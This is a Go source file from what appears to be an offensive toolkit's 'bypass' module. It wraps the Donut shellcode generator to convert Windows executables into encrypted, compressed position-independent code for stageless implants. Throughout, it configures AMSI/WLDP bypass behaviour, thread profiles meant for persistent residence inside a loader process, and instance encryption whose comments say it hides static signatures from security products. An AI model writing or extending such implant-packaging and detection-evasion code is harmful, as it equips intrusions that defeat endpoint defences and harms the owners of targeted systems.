package godonut

import (
	"errors"
	"runtime"
	"strings"
	"sync"

	"EasyTools/app/bypass/donut/gonut"
	"EasyTools/app/bypass/donut/piclayout"
)

// normalizeDonutArch 将会话 Arch（如 windows_amd64）映射为 Donut 所需 amd64/386。
func normalizeDonutArch(architecture string) (string, error) {
	a := strings.ToLower(strings.TrimSpace(architecture))
	if a == "" {
		return "", errors.New("pic: unsupported architecture")
	}
	if strings.Contains(a, "arm64") || strings.Contains(a, "aarch64") {
		return "", errors.New("pic: arm64 session cannot use donut inline-bin")
	}
	if a == "x64" || a == "amd64" || strings.Contains(a, "amd64") || strings.Contains(a, "x86_64") ||
		strings.HasSuffix(a, "_x64") {
		return "amd64", nil
	}
	if a == "x86" || a == "386" || a == "i386" ||
		strings.Contains(a, "386") || strings.Contains(a, "i386") ||
		(strings.Contains(a, "x86") && !strings.Contains(a, "x86_64")) {
		return "386", nil
	}
	return "", errors.New("pic: unsupported architecture: " + architecture)
}

// BuildPIC 将 PE 转为 Donut PIC（模块 NONE）。
func BuildPIC(fileContent []byte, runParams string, architecture string) ([]byte, error) {
	return BuildPICUncompressed(fileContent, runParams, architecture)
}

// BuildPICUncompressed 将 PE 转为 Donut PIC，不在 Donut 内再压缩模块（用于已对 PE 做 UPX 的极简路径）。
func BuildPICUncompressed(fileContent []byte, runParams string, architecture string) ([]byte, error) {
	return buildPICWithCompress(fileContent, runParams, architecture, gonut.GONUT_COMPRESS_NONE)
}

// ImplantDonutProfile Stageless Donut 封装策略（loader 进程内反射加载时可轮换重试）。
type ImplantDonutProfile string

const (
	ImplantProfileThreadBlock      ImplantDonutProfile = "thread_block"
	ImplantProfileThreadExit       ImplantDonutProfile = "thread_exit"
	ImplantProfileLegacy           ImplantDonutProfile = "legacy"
	ImplantProfileThreadBlockAplib ImplantDonutProfile = "thread_block_aplib"
	// ImplantProfileThreadBlockNone 不压缩模块（体积最大，仅排障）。
	ImplantProfileThreadBlockNone ImplantDonutProfile = "thread_block_none"
)

// ImplantPICMeta Donut PIC 及压缩信息。
type ImplantPICMeta struct {
	PIC      []byte
	Compress string
	Profile  string
}

// BuildImplantPIC Stageless 完整植入体：独立线程 + EXIT_BLOCK，利于 loader CreateThread 后长期驻留。
func BuildImplantPIC(fileContent []byte, runParams string, architecture string) ([]byte, error) {
	return BuildImplantPICProfile(fileContent, runParams, architecture, ImplantProfileThreadBlock)
}

// BuildImplantPICProfile 按 profile 生成 Stageless Donut PIC。
func BuildImplantPICProfile(fileContent []byte, runParams string, architecture string, profile ImplantDonutProfile) ([]byte, error) {
	meta, err := BuildImplantPICProfileMeta(fileContent, runParams, architecture, profile)
	if err != nil {
		return nil, err
	}
	return meta.PIC, nil
}

// BuildImplantPICProfileMeta 按 profile 生成 Donut PIC，并返回采用的压缩算法。
func BuildImplantPICProfileMeta(fileContent []byte, runParams string, architecture string, profile ImplantDonutProfile) (ImplantPICMeta, error) {
	var out ImplantPICMeta
	p := ImplantDonutProfile(strings.TrimSpace(strings.ToLower(string(profile))))
	if p == "" {
		p = ImplantProfileThreadBlock
	}
	out.Profile = string(p)

	var (
		pic      []byte
		compress string
		err      error
	)
	switch p {
	case ImplantProfileThreadBlock:
		pic, compress, err = genImplantSmallest(fileContent, runParams, architecture, gonut.GONUT_THREAD_TRUE, gonut.DONUT_OPT_EXIT_BLOCK)
	case ImplantProfileThreadBlockAplib:
		pic, compress, err = genImplantWithCompressFallback(fileContent, runParams, architecture, gonut.GONUT_THREAD_TRUE, gonut.DONUT_OPT_EXIT_BLOCK, gonut.GONUT_COMPRESS_APLIB)
	case ImplantProfileThreadBlockNone:
		pic, err = buildImplantPICWithOpts(fileContent, runParams, architecture, gonut.GONUT_COMPRESS_NONE, gonut.GONUT_THREAD_TRUE, gonut.DONUT_OPT_EXIT_BLOCK)
		compress = gonut.GONUT_COMPRESS_NONE.Name()
	case ImplantProfileThreadExit:
		pic, compress, err = genImplantSmallest(fileContent, runParams, architecture, gonut.GONUT_THREAD_TRUE, gonut.DONUT_OPT_EXIT_THREAD)
	case ImplantProfileLegacy:
		pic, compress, err = genImplantSmallest(fileContent, runParams, architecture, gonut.GONUT_THREAD_FALSE, gonut.DONUT_OPT_EXIT_THREAD)
	default:
		return out, errors.New("pic: unknown donut profile: " + string(profile))
	}
	if err != nil {
		return out, err
	}
	out.PIC = pic
	out.Compress = compress
	return out, nil
}

func implantCompressCandidates() []gonut.CompressionType {
	candidates := []gonut.CompressionType{
		gonut.GONUT_COMPRESS_APLIB,
		gonut.GONUT_COMPRESS_XPRESS,
		gonut.GONUT_COMPRESS_LZNT1,
	}
	if runtime.GOOS == "windows" {
		candidates = append(candidates, gonut.GONUT_COMPRESS_XPRESS_RTL, gonut.GONUT_COMPRESS_LZNT1_RTL)
	}
	return append(candidates, gonut.GONUT_COMPRESS_NONE)
}

func genImplantSmallest(fileContent []byte, runParams string, architecture string, thread gonut.BoolType, exitOpt gonut.ExitType) ([]byte, string, error) {
	candidates := implantCompressCandidates()
	type candidateResult struct {
		data []byte
		name string
		err  error
	}
	results := make(chan candidateResult, len(candidates))
	var wg sync.WaitGroup
	for _, compress := range candidates {
		wg.Add(1)
		go func(c gonut.CompressionType) {
			defer wg.Done()
			data, err := buildImplantPICWithOpts(fileContent, runParams, architecture, c, thread, exitOpt)
			results <- candidateResult{data: data, name: c.Name(), err: err}
		}(compress)
	}
	go func() {
		wg.Wait()
		close(results)
	}()

	var (
		best       []byte
		bestName   string
		lastErr    error
		hadSuccess bool
	)
	for r := range results {
		if r.err != nil {
			lastErr = r.err
			continue
		}
		if len(r.data) < 64 || piclayout.Validate(r.data) != nil {
			continue
		}
		hadSuccess = true
		if best == nil || len(r.data) < len(best) {
			best = r.data
			bestName = r.name
		}
	}
	if best != nil {
		return best, bestName, nil
	}
	if lastErr != nil {
		return nil, "", lastErr
	}
	if hadSuccess {
		return nil, "", errors.New("pic: donut PIC invalid")
	}
	return nil, "", errors.New("pic: donut compress failed")
}

func genImplantWithCompressFallback(fileContent []byte, runParams string, architecture string, thread gonut.BoolType, exitOpt gonut.ExitType, prefer gonut.CompressionType) ([]byte, string, error) {
	data, err := buildImplantPICWithOpts(fileContent, runParams, architecture, prefer, thread, exitOpt)
	if err == nil && len(data) >= 64 && piclayout.Validate(data) == nil {
		return data, prefer.Name(), nil
	}
	data, err = buildImplantPICWithOpts(fileContent, runParams, architecture, gonut.GONUT_COMPRESS_NONE, thread, exitOpt)
	if err != nil {
		return nil, "", err
	}
	return data, gonut.GONUT_COMPRESS_NONE.Name(), nil
}

func buildImplantPICWithCompress(fileContent []byte, runParams string, architecture string, compress gonut.CompressionType) ([]byte, error) {
	return buildImplantPICWithOpts(fileContent, runParams, architecture, compress, gonut.GONUT_THREAD_TRUE, gonut.DONUT_OPT_EXIT_BLOCK)
}

func buildImplantPICWithOpts(fileContent []byte, runParams string, architecture string, compress gonut.CompressionType, thread gonut.BoolType, exitOpt gonut.ExitType) ([]byte, error) {
	donutArch, err := normalizeDonutArch(architecture)
	if err != nil {
		return nil, err
	}
	c := gonut.DefaultConfig()
	c.ModuleName = ""
	c.Server = ""
	// 启用实例加密，避免 amsi/wldp/DLL_NAMES 等明文落在 PIC 内（经典 Donut 静态特征）。
	c.Entropy = gonut.DONUT_ENTROPY_DEFAULT
	switch donutArch {
	case "amd64":
		c.Arch = gonut.DONUT_ARCH_X64
	case "386":
		c.Arch = gonut.DONUT_ARCH_X86
	default:
		return nil, errors.New("pic: unsupported architecture")
	}
	c.Output = ""
	c.Format = gonut.DONUT_FORMAT_BINARY
	c.OEP = 0
	c.ExitOpt = exitOpt
	c.Thread = thread
	c.Class = ""
	c.Domain = ""
	c.InputByte = fileContent
	c.Method = ""
	c.Args = runParams
	c.Unicode = false
	c.Runtime = ""
	c.GonutCompress = compress
	c.Bypass = gonut.DONUT_BYPASS_CONTINUE
	// KEEP：Go 反射映射依赖完整 PE 头完成加载；清头在植入体 main 启动后由 MemShield 处理（Lotok）。
	c.Headers = gonut.DONUT_HEADERS_KEEP
	c.LoaderMemHarden = false
	c.Decoy = ""
	c.Verbose = false
	o := gonut.New(c)
	if err := o.ValidateLoaderConfig(); err != nil {
		return nil, err
	}
	if err := o.ReadFileInfo(); err != nil {
		return nil, err
	}
	if err := o.ValidateFileInfo(); err != nil {
		return nil, err
	}
	if err := o.BuildModule(); err != nil {
		return nil, err
	}
	if err := o.BuildInstance(); err != nil {
		return nil, err
	}
	if err := o.BuildLoader(); err != nil {
		return nil, err
	}
	return o.PicData, nil
}

// BuildPICCompact 极简用：Donut 模块内优先 APLIB 以减小 PIC，失败则 NONE。
func BuildPICCompact(fileContent []byte, runParams string, architecture string) ([]byte, error) {
	data, err := buildPICWithCompress(fileContent, runParams, architecture, gonut.GONUT_COMPRESS_APLIB)
	if err == nil {
		return data, nil
	}
	return buildPICWithCompress(fileContent, runParams, architecture, gonut.GONUT_COMPRESS_NONE)
}

func buildPICWithCompress(fileContent []byte, runParams string, architecture string, compress gonut.CompressionType) ([]byte, error) {
	donutArch, err := normalizeDonutArch(architecture)
	if err != nil {
		return nil, err
	}
	c := gonut.DefaultConfig()
	c.ModuleName = ""
	c.Server = ""
	// 实例区 ChasKey 加密 + 随机 Maru IV，削弱明文 bypass 字符串与固定 Hash[] 特征。
	c.Entropy = gonut.DONUT_ENTROPY_DEFAULT
	switch donutArch {
	case "amd64":
		c.Arch = gonut.DONUT_ARCH_X64
	case "386":
		c.Arch = gonut.DONUT_ARCH_X86
	default:
		return nil, errors.New("pic: unsupported architecture")
	}
	c.Output = ""
	c.Format = gonut.DONUT_FORMAT_BINARY
	c.OEP = 0
	c.ExitOpt = gonut.DONUT_OPT_EXIT_THREAD
	c.Class = ""
	c.Domain = ""
	c.InputByte = fileContent
	c.Method = ""
	c.Args = runParams
	c.Unicode = false
	c.Runtime = ""
	c.Thread = false
	c.GonutCompress = compress
	c.Bypass = gonut.DONUT_BYPASS_CONTINUE
	c.Headers = gonut.DONUT_HEADERS_OVERWRITE
	c.Decoy = ""
	c.Verbose = false
	o := gonut.New(c)
	if err := o.ValidateLoaderConfig(); err != nil {
		return nil, err
	}
	if err := o.ReadFileInfo(); err != nil {
		return nil, err
	}
	if err := o.ValidateFileInfo(); err != nil {
		return nil, err
	}
	if err := o.BuildModule(); err != nil {
		return nil, err
	}
	if err := o.BuildInstance(); err != nil {
		return nil, err
	}
	if err := o.BuildLoader(); err != nil {
		return nil, err
	}
	return o.PicData, nil
}
